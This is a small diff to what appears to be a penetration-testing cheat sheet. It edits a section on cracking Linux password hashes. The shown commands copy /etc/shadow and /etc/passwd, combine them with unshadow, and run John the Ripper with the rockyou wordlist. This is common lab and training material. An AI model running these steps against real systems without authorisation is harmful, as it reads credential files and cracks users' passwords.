@@ -259,12 +259,9 @@ victim machine with powershell
 
 Cracking Shadow Hash
 
-`copy the file` `/etc/shadow` `and` `/etc/passwd` `to and same path` 
+`copy the file` `/etc/shadow` `and` `/etc/passwd` `to and same path` `then crack with john`
 
 	unshadow passwd shadow > john.hash
-
-`now crack with john`
-	
 	john john.hash --wordlist=/usr/share/wordlists/rockyou.txt 
 
 
